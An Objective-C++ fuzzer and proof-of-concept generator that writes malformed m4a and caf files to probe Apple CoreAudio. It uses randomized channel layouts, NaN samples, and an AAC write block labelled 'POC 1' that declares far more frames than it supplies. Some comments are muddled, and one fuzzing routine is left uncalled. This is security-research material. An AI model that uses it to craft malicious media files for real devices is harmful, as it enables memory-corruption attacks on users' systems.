@import AVFAudio;
@import AudioToolbox;
#include <vector>
#include <random>
#include <stdio.h>
#include <time.h> // Required for ctime and time

// It's good practice to define CodecConfig if it's used,
// even if this particular PoC doesn't heavily rely on its specific fuzzing aspects.
struct CodecConfig {
  char padding0[0x78];
  AudioChannelLayout* remappingChannelLayout;
  char padding1[0xe0 - 0x80]; // Corrected size based on 0xe0 - 0x80
  std::vector<char> mRemappingArray; // Renamed from mRemappingArray to mRemappingArray

  CodecConfig() : remappingChannelLayout(nullptr) {}
  ~CodecConfig() {
    if (remappingChannelLayout) {
      free(remappingChannelLayout); // Use free for memory allocated with calloc/malloc
    }
  }
};

// OverrideApac is part of the existing fuzzer's logic,
// potentially targeting APAC-specific vulnerabilities or general channel layout fuzzing.
// It doesn't directly implement PoC 1 but contributes to overall file variability.
void OverrideApac(CodecConfig* config) {
  if (config->remappingChannelLayout) {
    // Intentionally set invalid channel layout tag for fuzzing
    // Ensure kAudioChannelLayoutTag_HOA_ACN_SN3D is defined or use a raw value.
    // For example, using a known valid base and ORing a small random value.
    config->remappingChannelLayout->mChannelLayoutTag = (kAudioChannelLayoutTag_HOA_ACN_SN3D & 0xFFFF0000) | (rand() % 0x10);
    fprintf(stderr, "Set channel layout tag to 0x%x\n", (unsigned int)config->remappingChannelLayout->mChannelLayoutTag);
  }
  config->mRemappingArray.resize(1024 + (rand() % 1024), (char)0xff); // Oversized array
}

int main() {
  time_t currentTime_start = time(nullptr);
  fprintf(stderr, "Starting encodeme at %s", ctime(&currentTime_start));

  std::vector<double> sampleRates = {16000, 44100, 48000, 96000};
  std::vector<AudioFormatID> formats = {kAudioFormatMPEG4AAC, kAudioFormatLinearPCM};
  std::random_device rd;
  std::mt19937 gen(rd());
  std::uniform_int_distribution<> formatDist(0, (int)formats.size() - 1);

  for (double sampleRate : sampleRates) {
    AudioFormatID formatID = formats[formatDist(gen)];
    fprintf(stderr, "Processing sample rate %.0f, format %u\n", sampleRate, (unsigned int)formatID);

    // AAC has minimum sample rate requirements.
    if (formatID == kAudioFormatMPEG4AAC && sampleRate < 8000) { // Common min for AAC is 8kHz, some encoders 16kHz
      fprintf(stderr, "Skipping potentially unsupported sample rate %.0f for AAC\n", sampleRate);
      continue;
    }

    uint32_t channelNum = 1 + (rand() % 8); // Random channels (1–8) for broader fuzzing
    fprintf(stderr, "Using %u channels\n", (unsigned int)channelNum);

    AVAudioFormat* formatIn = [[AVAudioFormat alloc] initStandardFormatWithSampleRate:sampleRate channels:channelNum];
    if (!formatIn) {
      fprintf(stderr, "Failed to create AVAudioFormat for rate %.0f, channels %u\n", sampleRate, (unsigned int)channelNum);
      continue;
    }

    AudioStreamBasicDescription outputDescription = {0}; // Initialize to zero
    outputDescription.mSampleRate = sampleRate;
    outputDescription.mFormatID = formatID;
    outputDescription.mChannelsPerFrame = channelNum;

    if (formatID == kAudioFormatLinearPCM) {
      outputDescription.mFormatFlags = kAudioFormatFlagIsFloat | kAudioFormatFlagIsPacked;
      outputDescription.mBitsPerChannel = 32;
      outputDescription.mBytesPerPacket = 4 * channelNum;
      outputDescription.mBytesPerFrame = 4 * channelNum;
      outputDescription.mFramesPerPacket = 1;
    } else if (formatID == kAudioFormatMPEG4AAC) {
      // For AAC, many fields are set by the encoder, but mFramesPerPacket is typically 1024 for AAC.
      // Let CoreAudio fill in most details for compressed formats.
      outputDescription.mFramesPerPacket = 1024; // Typical for AAC
      // Other fields like mBytesPerPacket, mBytesPerFrame, mBitsPerChannel are 0 for variable bitrate compressed audio.
    }


    // Using a slightly randomized HOA layout for general fuzzing.
    // kAudioChannelLayoutTag_HOA_ACN_SN3D requires AudioChannelLayout with mChannelBitmap = 0 and mNumberChannelDescriptions > 0
    // For simplicity, let's use a standard stereo/mono if not HOA, or a basic HOA.
    // The PoC 1 doesn't strictly depend on complex HOA layouts for AAC `stsz` manipulation.
    AudioChannelLayoutTag layoutTagToUse = kAudioChannelLayoutTag_Stereo; // Default
    if (channelNum == 1) layoutTagToUse = kAudioChannelLayoutTag_Mono;
    // else if (channelNum >= 4) layoutTagToUse = kAudioChannelLayoutTag_HOA_ACN_SN3D; // Example if wanting HOA

    AVAudioChannelLayout* channelLayout = [[AVAudioChannelLayout alloc] initWithLayoutTag:layoutTagToUse];
    if (!channelLayout || !channelLayout.layout) {
      fprintf(stderr, "Failed to create channel layout for rate %.0f, tag %u\n", sampleRate, (unsigned int)layoutTagToUse);
      continue;
    }
    
    // The CodecConfig and OverrideApac part seems more geared towards fuzzing APAC itself
    // or custom channel layout handling in ExtAudioFileCreateWithURL.
    // It's kept for general fuzzing value but not central to PoC 1's ExtAudioFileWrite manipulation.
    CodecConfig config;
    // Determine actual size needed by an AVAudioChannelLayout
    size_t aclSize = offsetof(AudioChannelLayout, mChannelDescriptions) + (channelNum * sizeof(AudioChannelDescription));
    if (channelLayout.layout->mChannelLayoutTag != kAudioChannelLayoutTag_UseChannelDescriptions) {
        aclSize = offsetof(AudioChannelLayout, mChannelDescriptions); // No descriptions if not UseChannelDescriptions
    }
    // Add some fuzz to layoutSize for creating config.remappingChannelLayout
    size_t fuzzedLayoutSize = aclSize + (sizeof(AudioChannelDescription) * (rand() % 5));

    config.remappingChannelLayout = (AudioChannelLayout*)calloc(1, fuzzedLayoutSize);
    if (!config.remappingChannelLayout) {
      fprintf(stderr, "Memory allocation failed for fuzzed channel layout, rate %.0f\n", sampleRate);
      continue;
    }
    // Copy only the valid part of the layout, then OverrideApac might fuzz it further
    memcpy(config.remappingChannelLayout, channelLayout.layout, std::min(fuzzedLayoutSize, aclSize) );
    // If layoutTagToUse was HOA, then OverrideApac would be more relevant.
    // OverrideApac(&config); // Call if specific APAC/HOA fuzzing is intended here.

    NSString* fileExtension = (formatID == kAudioFormatMPEG4AAC) ? @"m4a" : @"caf"; // PCM often in .caf
    NSString* fileName = [NSString stringWithFormat:@"output_%.0f_fmt%u_ch%u.%@", sampleRate, (unsigned int)formatID, (unsigned int)channelNum, fileExtension];
    NSURL* outUrl = [NSURL fileURLWithPath:fileName];
    fprintf(stderr, "Creating file: %s\n", fileName.UTF8String);

    ExtAudioFileRef audioFile = nullptr;
    // Pass the potentially fuzzed config.remappingChannelLayout to Create
    OSStatus status = ExtAudioFileCreateWithURL((__bridge CFURLRef)outUrl,
                                                (formatID == kAudioFormatMPEG4AAC) ? kAudioFileM4AType : kAudioFileCAFType,
                                                &outputDescription,
                                                config.remappingChannelLayout, // Using the fuzzed/copied layout
                                                kAudioFileFlags_EraseFile,
                                                &audioFile);
    if (status != noErr) {
      fprintf(stderr, "Error creating file (rate %.0f, format %u): %d (0x%x)\n", sampleRate, (unsigned int)formatID, (int)status, (unsigned int)status);
      // config.remappingChannelLayout is freed by CodecConfig destructor if it was assigned.
      // If config was stack allocated and we don't want its destructor to run yet, free manually or handle lifetime.
      // For simplicity here, assuming CodecConfig dtor will handle its member.
      continue;
    }

    // Set client data format (PCM float)
    AudioStreamBasicDescription clientFormat = *formatIn.streamDescription;
    status = ExtAudioFileSetProperty(audioFile, kExtAudioFileProperty_ClientDataFormat,
                                     sizeof(AudioStreamBasicDescription), &clientFormat);
    if (status != noErr) {
      fprintf(stderr, "Error setting client data format (rate %.0f, format %u): %d\n", sampleRate, (unsigned int)formatID, (int)status);
      ExtAudioFileDispose(audioFile);
      continue;
    }

    // Set client channel layout
    // Use the original, valid channelLayout.layout for setting property, not the fuzzed one.
    status = ExtAudioFileSetProperty(audioFile, kExtAudioFileProperty_ClientChannelLayout,
                                     sizeof(AudioChannelLayout) + (channelLayout.channelCount -1) * sizeof(AudioChannelDescription), // more precise size
                                     channelLayout.layout);
    if (status != noErr) {
      fprintf(stderr, "Error setting client channel layout (rate %.0f, format %u): %d\n", sampleRate, (unsigned int)formatID, (int)status);
      ExtAudioFileDispose(audioFile);
      continue;
    }
    
    // Define buffer size for actual PCM data to be written in one go
    // The original fuzzer used 44100. This is a reasonable number of PCM frames for a short audio clip.
    const UInt32 pcmFramesInBuffer = 44100;
    float* audioBuffer = new (std::nothrow) float[pcmFramesInBuffer * channelNum];
    if (!audioBuffer) {
      fprintf(stderr, "Failed to allocate audio buffer for rate %.0f\n", sampleRate);
      ExtAudioFileDispose(audioFile);
      continue;
    }

    std::uniform_real_distribution<float> dis(-1.0f, 1.0f); // Normalized float range
    for (size_t i = 0; i < pcmFramesInBuffer * channelNum; ++i) {
      audioBuffer[i] = dis(gen);
      if ((rand() % 100) < 5) { // Introduce invalid samples less frequently
        // audioBuffer[i] = std::numeric_limits<float>::infinity(); // Inf can cause issues, maybe NaN or large val
        audioBuffer[i] = NAN;
      }
    }
    fprintf(stderr, "Filled audio buffer for rate %.0f with %u PCM frames\n", sampleRate, (unsigned int)pcmFramesInBuffer);


    // --- POC 1 Implementation Start ---
    if (formatID == kAudioFormatMPEG4AAC) {
        UInt32 actualPCMFramesInData = 1024; // Actual PCM sample frames of data we are providing in this write
                                             // This is 1 AAC packet if mFramesPerPacket = 1024 for client
        UInt32 declaredPCMFramesForMetadata = 8192; // Inflated PCM sample frame count for ExtAudioFileWrite

        // Ensure audioBuffer has enough data for actualPCMFramesInData.
        if (pcmFramesInBuffer < actualPCMFramesInData) {
             fprintf(stderr, "Assertion failed: audioBuffer (size %u) not large enough for actualPCMFramesInData (%u)\n",
                (unsigned int)pcmFramesInBuffer, (unsigned int)actualPCMFramesInData);
             // Skip this specific write or handle error
             delete[] audioBuffer;
             ExtAudioFileDispose(audioFile);
             continue;
        }

        AudioBufferList pocAudioBufferList = {0}; // Initialize to zero
        pocAudioBufferList.mNumberBuffers = 1;
        pocAudioBufferList.mBuffers[0].mNumberChannels = channelNum;
        pocAudioBufferList.mBuffers[0].mDataByteSize = actualPCMFramesInData * channelNum * sizeof(float);
        pocAudioBufferList.mBuffers[0].mData = audioBuffer; // audioBuffer's beginning part is used

        fprintf(stderr, "PoC1 (AAC): Writing %u declared PCM frames with actual data for %u PCM frames.\n",
                (unsigned int)declaredPCMFramesForMetadata, (unsigned int)actualPCMFramesInData);
        status = ExtAudioFileWrite(audioFile, declaredPCMFramesForMetadata, &pocAudioBufferList);

    } else { // E.g., kAudioFormatLinearPCM
        // For non-AAC formats, write all frames from the buffer.
        AudioBufferList pcmAudioBufferList = {0}; // Initialize to zero
        pcmAudioBufferList.mNumberBuffers = 1;
        pcmAudioBufferList.mBuffers[0].mNumberChannels = channelNum;
        pcmAudioBufferList.mBuffers[0].mDataByteSize = pcmFramesInBuffer * channelNum * sizeof(float);
        pcmAudioBufferList.mBuffers[0].mData = audioBuffer;

        fprintf(stderr, "Non-AAC (e.g., PCM): Writing %u PCM frames with actual data for %u PCM frames.\n",
                (unsigned int)pcmFramesInBuffer, (unsigned int)pcmFramesInBuffer);
        status = ExtAudioFileWrite(audioFile, pcmFramesInBuffer, &pcmAudioBufferList);
    }
    // --- POC 1 Implementation End ---

    if (status != noErr) {
      fprintf(stderr, "Error writing audio (rate %.0f, format %u): %d\n", sampleRate, (unsigned int)formatID, (int)status);
    }

    status = ExtAudioFileDispose(audioFile);
    if (status != noErr) {
      fprintf(stderr, "Error disposing file (rate %.0f, format %u): %d\n", sampleRate, (unsigned int)formatID, (int)status);
    }

    delete[] audioBuffer;
    // CodecConfig's destructor will free config.remappingChannelLayout
    fprintf(stderr, "Completed processing for sample rate %.0f, format %u\n", sampleRate, (unsigned int)formatID);
  } // End of sampleRates loop

  time_t currentTime_end = time(nullptr);
  fprintf(stderr, "encodeme completed at %s", ctime(&currentTime_end));
  return 0;
}
